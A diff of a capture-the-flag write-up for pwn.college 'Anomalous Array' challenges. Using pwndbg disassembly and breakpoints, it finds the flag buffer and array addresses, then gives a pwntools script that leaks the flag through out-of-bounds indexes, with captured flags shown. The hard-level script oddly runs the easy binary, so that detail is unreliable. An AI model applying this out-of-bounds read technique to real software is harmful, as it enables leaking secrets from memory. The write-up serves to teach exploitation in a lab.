@@ -3170,61 +3170,47 @@ So our logic is working, but we will have to brute force 8 bytes of the flag at 
 
 ```py title="~/script" showLineNumbers
 from pwn import *
+import re
 
-p = process('/challenge/anomalous-array-easy')
-
+# Setup addresses
 array_addr = 0x7ffc61dcecc8
 flag_addr  = 0x7ffc61dcdd50
 chunk_size = 8
 
-# Calculate offset and index
-offset = flag_addr - array_addr
-base_index  = offset // chunk_size
+# Calculate starting point
+base_index = (flag_addr - array_addr) // chunk_size
 
 flag = ""
-flag_len = 59
+current_index = base_index
 
-chunks_needed = (flag_len + chunk_size - 1) // chunk_size
-index_incr = list(range(chunks_needed))
+print("[*] Starting dynamic leak...")
 
-log.success(f"Offset: {offset}")
-log.success(f"Index:  {base_index}")
-log.success(f"Flag Addr: {hex(flag_addr)}")
-
-print("[*] Starting brute force leak...")
-
-for incr in index_incr:
-    index = base_index + incr
-    p = process('/challenge/anomalous-array-easy')
-    p.sendlineafter(b"view?", str(index).encode())
+while "}" not in flag:
+    # Start fresh process for each 8-byte read
+    p = process('/challenge/anomalous-array-easy', level='error') 
+    
+    p.sendlineafter(b"Which number would you like to view?", str(current_index).encode())
     output = p.recvall().decode(errors="ignore")
-
+    
+    # Extract hex
     match = re.search(r"Your hacker number is ([0-9a-fA-F]+)", output)
     if match:
-        hacker_num = match.group(1)
+        hacker_num = match.group(1).zfill(16) # Pad to 8 bytes
         
-        # 1. Pad to 16 chars (8 bytes) so fromhex doesn't fail 
-        # and little-endian flip works correctly.
-        hacker_num = hacker_num.zfill(16) 
-        
-        # 2. Decode the full 8-byte chunk
+        # Convert from hex -> reverse for little endian -> decode
         chunk_bytes = bytes.fromhex(hacker_num)[::-1]
+        flag_chunk = chunk_bytes.decode('latin-1')
         
-        # 3. If it's the last iteration, only take the remaining bytes
-        if incr == index_incr[-1]:
-            remaining_bytes = flag_len % chunk_size
-            # If flag_len is a multiple of 8, remaining_bytes would be 0, 
-            # but we'd actually want all 8.
-            if remaining_bytes == 0: remaining_bytes = 8
-            
-            flag_chunk = chunk_bytes[:remaining_bytes].decode('latin-1')
-        else:
-            flag_chunk = chunk_bytes.decode('latin-1')
-
-        # print(f"[{index}] {hacker_num} -> {flag_chunk!r}")
         flag += flag_chunk
+        print(f"Index {current_index}: Found {flag_chunk!r}")
+        
+    current_index += 1
 
-print(flag)
+# Clean up any trailing garbage after the closing brace
+final_flag = flag.split("}")[0] + "}"
+
+print("-" * 20)
+log.success(f"Flag captured: {final_flag}")
 ```
 
 ```
@@ -3241,3 +3227,428 @@ Index -488: Found 'zW}\n\x00\x00\x00\x00'
 --------------------
 [+] Flag captured: pwn.college{kBqRnXbNGylh6kMzuR4hcLmTdvu.QX0gzN4EDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Anomalous Array (Hard)
+
+> Leverage an Array to obtain the flag.
+
+```
+hacker@program-security~anomalous-array-hard:/$ /challenge/anomalous-array-hard 
+Which number would you like to view? 0
+Your hacker number is ffffffffdeadbeef
+Goodbye!
+```
+
+In order to solve this challenge, we need the following things:
+
+* [ ] Location of flag
+* [ ] Location of array
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000001551 <+0>:     endbr64
+   0x0000000000001555 <+4>:     push   rbp
+   0x0000000000001556 <+5>:     mov    rbp,rsp
+   0x0000000000001559 <+8>:     sub    rsp,0x640
+   0x0000000000001560 <+15>:    mov    DWORD PTR [rbp-0x624],edi
+   0x0000000000001566 <+21>:    mov    QWORD PTR [rbp-0x630],rsi
+   0x000000000000156d <+28>:    mov    QWORD PTR [rbp-0x638],rdx
+   0x0000000000001574 <+35>:    lea    rdx,[rbp-0x5c0]
+   0x000000000000157b <+42>:    mov    eax,0x0
+   0x0000000000001580 <+47>:    mov    ecx,0xb5
+   0x0000000000001585 <+52>:    mov    rdi,rdx
+   0x0000000000001588 <+55>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000000158b <+58>:    lea    rax,[rbp-0x5c0]
+   0x0000000000001592 <+65>:    mov    QWORD PTR [rbp-0x10],rax
+   0x0000000000001596 <+69>:    mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000000159e <+77>:    mov    esi,0x0
+   0x00000000000015a3 <+82>:    lea    rdi,[rip+0xa5e]        # 0x2008
+   0x00000000000015aa <+89>:    mov    eax,0x0
+   0x00000000000015af <+94>:    call   0x10e0 <open@plt>
+   0x00000000000015b4 <+99>:    mov    ecx,eax
+   0x00000000000015b6 <+101>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000000015ba <+105>:   mov    edx,0x100
+   0x00000000000015bf <+110>:   mov    rsi,rax
+   0x00000000000015c2 <+113>:   mov    edi,ecx
+   0x00000000000015c4 <+115>:   call   0x10c0 <read@plt>
+   0x00000000000015c9 <+120>:   mov    QWORD PTR [rbp-0x18],0x1000
+   0x00000000000015d1 <+128>:   mov    DWORD PTR [rbp-0x610],0xdeadbeef
+   0x00000000000015db <+138>:   mov    DWORD PTR [rbp-0x60c],0x1337c0de
+   0x00000000000015e5 <+148>:   mov    DWORD PTR [rbp-0x608],0xfaceb00c
+   0x00000000000015ef <+158>:   mov    DWORD PTR [rbp-0x604],0xfeedface
+   0x00000000000015f9 <+168>:   mov    DWORD PTR [rbp-0x600],0x8badf00d
+   0x0000000000001603 <+178>:   mov    DWORD PTR [rbp-0x5fc],0x1337
+   0x000000000000160d <+188>:   mov    DWORD PTR [rbp-0x5f8],0xc0ffee
+   0x0000000000001617 <+198>:   mov    DWORD PTR [rbp-0x5f4],0xf00dbeef
+   0x0000000000001621 <+208>:   mov    DWORD PTR [rbp-0x5f0],0x1337beef
+   0x000000000000162b <+218>:   mov    DWORD PTR [rbp-0x5ec],0xb00cdead
+   0x0000000000001635 <+228>:   mov    DWORD PTR [rbp-0x5e8],0xface1337
+   0x000000000000163f <+238>:   mov    DWORD PTR [rbp-0x5e4],0xcafebabe
+   0x0000000000001649 <+248>:   mov    DWORD PTR [rbp-0x5e0],0xbaadf00d
+   0x0000000000001653 <+258>:   mov    DWORD PTR [rbp-0x5dc],0x600d1dea
+   0x000000000000165d <+268>:   mov    DWORD PTR [rbp-0x5d8],0xbadc0de
+   0x0000000000001667 <+278>:   mov    DWORD PTR [rbp-0x5d4],0xdead10cc
+   0x0000000000001671 <+288>:   mov    DWORD PTR [rbp-0x5d0],0xbadcab1e
+   0x000000000000167b <+298>:   mov    DWORD PTR [rbp-0x5cc],0xddba11
+   0x0000000000001685 <+308>:   mov    DWORD PTR [rbp-0x4],0x0
+   0x000000000000168c <+315>:   jmp    0x16da <challenge+393>
+   0x000000000000168e <+317>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001691 <+320>:   movsxd rcx,eax
+   0x0000000000001694 <+323>:   movabs rdx,0xe38e38e38e38e38f
+   0x000000000000169e <+333>:   mov    rax,rcx
+   0x00000000000016a1 <+336>:   mul    rdx
+   0x00000000000016a4 <+339>:   shr    rdx,0x4
+   0x00000000000016a8 <+343>:   mov    rax,rdx
+   0x00000000000016ab <+346>:   shl    rax,0x3
+   0x00000000000016af <+350>:   add    rax,rdx
+   0x00000000000016b2 <+353>:   add    rax,rax
+   0x00000000000016b5 <+356>:   sub    rcx,rax
+   0x00000000000016b8 <+359>:   mov    rdx,rcx
+   0x00000000000016bb <+362>:   mov    eax,DWORD PTR [rbp+rdx*4-0x610]
+   0x00000000000016c2 <+369>:   cdqe
+   0x00000000000016c4 <+371>:   mov    edx,DWORD PTR [rbp-0x4]
+   0x00000000000016c7 <+374>:   movsxd rdx,edx
+   0x00000000000016ca <+377>:   add    rdx,0x54
+   0x00000000000016ce <+381>:   mov    QWORD PTR [rbp+rdx*8-0x5b8],rax
+   0x00000000000016d6 <+389>:   add    DWORD PTR [rbp-0x4],0x1
+   0x00000000000016da <+393>:   cmp    DWORD PTR [rbp-0x4],0x5f
+   0x00000000000016de <+397>:   jle    0x168e <challenge+317>
+   0x00000000000016e0 <+399>:   mov    DWORD PTR [rbp-0x614],0x0
+   0x00000000000016ea <+409>:   lea    rdi,[rip+0x91f]        # 0x2010
+   0x00000000000016f1 <+416>:   mov    eax,0x0
+   0x00000000000016f6 <+421>:   call   0x10b0 <printf@plt>
+   0x00000000000016fb <+426>:   lea    rax,[rbp-0x614]
+   0x0000000000001702 <+433>:   mov    rsi,rax
+   0x0000000000001705 <+436>:   lea    rdi,[rip+0x92a]        # 0x2036
+   0x000000000000170c <+443>:   mov    eax,0x0
+   0x0000000000001711 <+448>:   call   0x10f0 <__isoc99_scanf@plt>
+   0x0000000000001716 <+453>:   mov    eax,DWORD PTR [rbp-0x614]
+   0x000000000000171c <+459>:   cdqe
+   0x000000000000171e <+461>:   add    rax,0x54
+   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
+   0x000000000000172a <+473>:   mov    rsi,rax
+   0x000000000000172d <+476>:   lea    rdi,[rip+0x905]        # 0x2039
+   0x0000000000001734 <+483>:   mov    eax,0x0
+   0x0000000000001739 <+488>:   call   0x10b0 <printf@plt>
+   0x000000000000173e <+493>:   lea    rdi,[rip+0x910]        # 0x2055
+   0x0000000000001745 <+500>:   call   0x10a0 <puts@plt>
+   0x000000000000174a <+505>:   mov    eax,0x0
+   0x000000000000174f <+510>:   leave
+   0x0000000000001750 <+511>:   ret
+End of assembler dump.
+```
+
+```
+# --- snip ---
+
+   0x000000000000159e <+77>:    mov    esi,0x0
+   0x00000000000015a3 <+82>:    lea    rdi,[rip+0xa5e]        # 0x2008
+   0x00000000000015aa <+89>:    mov    eax,0x0
+   0x00000000000015af <+94>:    call   0x10e0 <open@plt>
+   0x00000000000015b4 <+99>:    mov    ecx,eax
+   0x00000000000015b6 <+101>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000000015ba <+105>:   mov    edx,0x100
+   0x00000000000015bf <+110>:   mov    rsi,rax
+   0x00000000000015c2 <+113>:   mov    edi,ecx
+   0x00000000000015c4 <+115>:   call   0x10c0 <read@plt>
+
+# --- snip ---
+```
+
+The program opens a file, and then reads the contents of said file.
+In the `open@plt` call, the `rdi` register holds thename of the file to be read whereas in the `read@plt` call, the `rsi` register holds the location of the buffer.
+
+Let's set breakpoints at `challenge+94` to see which file is being read, and at `challenge+115` in order to see where the file's contents are being read.
+
+```
+pwndbg> break *(challenge+94)
+Breakpoint 1 at 0x15af
+pwndbg> break *(challenge+115)
+Breakpoint 2 at 0x15c4
+```
+
+```
+pwndbg> run
+Starting program: /challenge/anomalous-array-hard 
+
+Breakpoint 1, 0x000064b966f8d5af in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
+ RAX  0
+ RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x7ffe79e96110 ◂— 0
+ RDI  0x64b966f8e008 ◂— 0x67616c662f /* '/flag' */
+ RSI  0
+ R8   0
+ R9   0x74d42a14fd60 (_dl_fini) ◂— endbr64 
+ R10  0x13
+ R11  2
+ R12  0x64b966f8d100 (_start) ◂— endbr64 
+ R13  0x7ffe79e977f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
+ RSP  0x7ffe79e96090 ◂— 0
+ RIP  0x64b966f8d5af (challenge+94) ◂— call open@plt
+─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
+ ► 0x64b966f8d5af <challenge+94>     call   open@plt                    <open@plt>
+        file: 0x64b966f8e008 ◂— 0x67616c662f /* '/flag' */
+        oflag: 0
+        vararg: 0x7ffe79e96110 ◂— 0
+ 
+   0x64b966f8d5b4 <challenge+99>     mov    ecx, eax
+   0x64b966f8d5b6 <challenge+101>    mov    rax, qword ptr [rbp - 0x10]
+   0x64b966f8d5ba <challenge+105>    mov    edx, 0x100                      EDX => 0x100
+   0x64b966f8d5bf <challenge+110>    mov    rsi, rax
+   0x64b966f8d5c2 <challenge+113>    mov    edi, ecx
+b+ 0x64b966f8d5c4 <challenge+115>    call   read@plt                    <read@plt>
+ 
+   0x64b966f8d5c9 <challenge+120>    mov    qword ptr [rbp - 0x18], 0x1000
+   0x64b966f8d5d1 <challenge+128>    mov    dword ptr [rbp - 0x610], 0xdeadbeef
+   0x64b966f8d5db <challenge+138>    mov    dword ptr [rbp - 0x60c], 0x1337c0de
+   0x64b966f8d5e5 <challenge+148>    mov    dword ptr [rbp - 0x608], 0xfaceb00c
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe79e96090 ◂— 0
+01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
+03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
+04:0020│-620 0x7ffe79e960b0 ◂— 0
+... ↓        3 skipped
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► 0   0x64b966f8d5af challenge+94
+   1   0x64b966f8d7d7 main+134
+   2   0x74d429f60083 __libc_start_main+243
+   3   0x64b966f8d12e _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can see that the content of `rdi` is `/flag` right before the `open@plt` call is made. So, it is reding the flag. Let's continue and see where to.
+
+```
+pwndbg> c
+Continuing.
+
+Breakpoint 2, 0x000064b966f8d5c4 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
+*RAX  0x7ffe79e96110 ◂— 0
+ RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
+*RCX  0xffffffff
+*RDX  0x100
+*RDI  0xffffffff
+*RSI  0x7ffe79e96110 ◂— 0
+ R8   0
+ R9   0x74d42a14fd60 (_dl_fini) ◂— endbr64 
+*R10  0
+*R11  0x246
+ R12  0x64b966f8d100 (_start) ◂— endbr64 
+ R13  0x7ffe79e977f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
+ RSP  0x7ffe79e96090 ◂— 0
+*RIP  0x64b966f8d5c4 (challenge+115) ◂— call read@plt
+─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
+   0x64b966f8d5b4 <challenge+99>     mov    ecx, eax
+   0x64b966f8d5b6 <challenge+101>    mov    rax, qword ptr [rbp - 0x10]
+   0x64b966f8d5ba <challenge+105>    mov    edx, 0x100                      EDX => 0x100
+   0x64b966f8d5bf <challenge+110>    mov    rsi, rax
+   0x64b966f8d5c2 <challenge+113>    mov    edi, ecx
+ ► 0x64b966f8d5c4 <challenge+115>    call   read@plt                    <read@plt>
+        fd: 0xffffffff
+        buf: 0x7ffe79e96110 ◂— 0
+        nbytes: 0x100
+ 
+   0x64b966f8d5c9 <challenge+120>    mov    qword ptr [rbp - 0x18], 0x1000
+   0x64b966f8d5d1 <challenge+128>    mov    dword ptr [rbp - 0x610], 0xdeadbeef
+   0x64b966f8d5db <challenge+138>    mov    dword ptr [rbp - 0x60c], 0x1337c0de
+   0x64b966f8d5e5 <challenge+148>    mov    dword ptr [rbp - 0x608], 0xfaceb00c
+   0x64b966f8d5ef <challenge+158>    mov    dword ptr [rbp - 0x604], 0xfeedface
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe79e96090 ◂— 0
+01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
+03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
+04:0020│-620 0x7ffe79e960b0 ◂— 0
+... ↓        3 skipped
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► 0   0x64b966f8d5c4 challenge+115
+   1   0x64b966f8d7d7 main+134
+   2   0x74d429f60083 __libc_start_main+243
+   3   0x64b966f8d12e _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+So we have the location where is flag is stored in memory. 
+
+* [x] Location of flag: `0x7ffe79e96110`
+* [ ] Location of array
+
+Later in the assembly, we can see that the program calls `scanf` to read the `index` from the user, performs some operations using that index, and then prints the data.
+
+```
+# --- snip ---
+
+   0x00000000000016fb <+426>:   lea    rax,[rbp-0x614]
+   0x0000000000001702 <+433>:   mov    rsi,rax
+   0x0000000000001705 <+436>:   lea    rdi,[rip+0x92a]        # 0x2036
+   0x000000000000170c <+443>:   mov    eax,0x0
+   0x0000000000001711 <+448>:   call   0x10f0 <__isoc99_scanf@plt>
+   0x0000000000001716 <+453>:   mov    eax,DWORD PTR [rbp-0x614]
+   0x000000000000171c <+459>:   cdqe
+   0x000000000000171e <+461>:   add    rax,0x54
+   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
+   0x000000000000172a <+473>:   mov    rsi,rax
+   0x000000000000172d <+476>:   lea    rdi,[rip+0x905]        # 0x2039
+   0x0000000000001734 <+483>:   mov    eax,0x0
+   0x0000000000001739 <+488>:   call   0x10b0 <printf@plt>
+
+# --- snip ---   
+```
+
+Specifically, if we look at these instruction: 
+```
+   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
+   0x000000000000172a <+473>:   mov    rsi,rax
+```
+We can see that a value is moved in `rax`, then `rsi` and then it printed. This value is the `hacker_num`.
+
+If we pass `index=0` the value at the start of the array will be returned to us as `hacker_num` and we will also get to see it's location, and thus the location of the array.
+
+```
+pwndbg> break *(challenge+465)
+Breakpoint 3 at 0x64b966f8d722
+```
+
+```
+pwndbg> c
+Continuing.
+Which number would you like to view? 0
+
+Breakpoint 3, 0x000064b966f8d722 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
+*RAX  0x54
+ RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
+*RCX  0
+*RDX  0
+*RDI  0x7ffe79e95b50 ◂— 0x30 /* '0' */
+*RSI  0
+*R8   0xa
+*R9   0
+*R10  0x74d42a0d7ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
+*R11  0
+ R12  0x64b966f8d100 (_start) ◂— endbr64 
+ R13  0x7ffe79e977f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
+ RSP  0x7ffe79e96090 ◂— 0
+*RIP  0x64b966f8d722 (challenge+465) ◂— mov rax, qword ptr [rbp + rax*8 - 0x5b8]
+─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
+ ► 0x64b966f8d722 <challenge+465>    mov    rax, qword ptr [rbp + rax*8 - 0x5b8]     RAX, [0x7ffe79e963b8] => 0xffffffffdeadbeef
+   0x64b966f8d72a <challenge+473>    mov    rsi, rax                                 RSI => 0xffffffffdeadbeef
+   0x64b966f8d72d <challenge+476>    lea    rdi, [rip + 0x905]                       RDI => 0x64b966f8e039 ◂— 'Your hacker number is %0lx\n'
+   0x64b966f8d734 <challenge+483>    mov    eax, 0                                   EAX => 0
+   0x64b966f8d739 <challenge+488>    call   printf@plt                  <printf@plt>
+ 
+   0x64b966f8d73e <challenge+493>    lea    rdi, [rip + 0x910]     RDI => 0x64b966f8e055 ◂— 'Goodbye!'
+   0x64b966f8d745 <challenge+500>    call   puts@plt                    <puts@plt>
+ 
+   0x64b966f8d74a <challenge+505>    mov    eax, 0                 EAX => 0
+   0x64b966f8d74f <challenge+510>    leave  
+   0x64b966f8d750 <challenge+511>    ret    
+ 
+   0x64b966f8d751 <main>             endbr64 
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe79e96090 ◂— 0
+01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
+03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
+04:0020│-620 0x7ffe79e960b0 ◂— 0
+05:0028│-618 0x7ffe79e960b8 ◂— 0
+06:0030│-610 0x7ffe79e960c0 ◂— 0x1337c0dedeadbeef
+07:0038│-608 0x7ffe79e960c8 ◂— 0xfeedfacefaceb00c
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► 0   0x64b966f8d722 challenge+465
+   1   0x64b966f8d7d7 main+134
+   2   0x74d429f60083 __libc_start_main+243
+   3   0x64b966f8d12e _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+If we look carefully at the `DISASM` section of teh output, we can see the `hacker_num` being moved into `rax`, and it's address.
+
+* [x] Location of flag: `0x7ffe79e96110`
+* [x] Location of array: `0x7ffe79e963b8`
+
+### Exploit
+
+```py title="~/script" showLineNumbers
+from pwn import *
+import re
+
+# Setup addresses
+array_addr = 0x7ffe79e963b8
+flag_addr  = 0x7ffe79e96110
+chunk_size = 8
+
+# Calculate starting point
+base_index = (flag_addr - array_addr) // chunk_size
+
+flag = ""
+current_index = base_index
+
+print("[*] Starting dynamic leak...")
+
+while "}" not in flag:
+    # Start fresh process for each 8-byte read
+    p = process('/challenge/anomalous-array-easy', level='error') 
+    
+    p.sendlineafter(b"Which number would you like to view?", str(current_index).encode())
+    output = p.recvall().decode(errors="ignore")
+    
+    # Extract hex
+    match = re.search(r"Your hacker number is ([0-9a-fA-F]+)", output)
+    if match:
+        hacker_num = match.group(1).zfill(16) # Pad to 8 bytes
+        
+        # Convert from hex -> reverse for little endian -> decode
+        chunk_bytes = bytes.fromhex(hacker_num)[::-1]
+        flag_chunk = chunk_bytes.decode('latin-1')
+        
+        flag += flag_chunk
+        print(f"Index {current_index}: Found {flag_chunk!r}")
+        
+    current_index += 1
+
+# Clean up any trailing garbage after the closing brace
+final_flag = flag.split("}")[0] + "}"
+
+print("-" * 20)
+log.success(f"Flag captured: {final_flag}")
+```
+
+```
+hacker@program-security~anomalous-array-hard:~$ python ~/script.py 
+[*] Starting dynamic leak...
+Index -85: Found 'pwn.coll'
+Index -84: Found 'ege{IEDf'
+Index -83: Found '8TN9GJDa'
+Index -82: Found '3d2J7WxH'
+Index -81: Found 'QBCBO8w.'
+Index -80: Found 'QX1gzN4E'
+Index -79: Found 'DL4ITM0E'
+Index -78: Found 'zW}\n\x00\x00\x00\x00'
+--------------------
+[+] Flag captured: pwn.college{IEDf8TN9GJDa3d2J7WxHQBCBO8w.QX1gzN4EDL4ITM0EzW}
+```
+
+&nbsp;
+
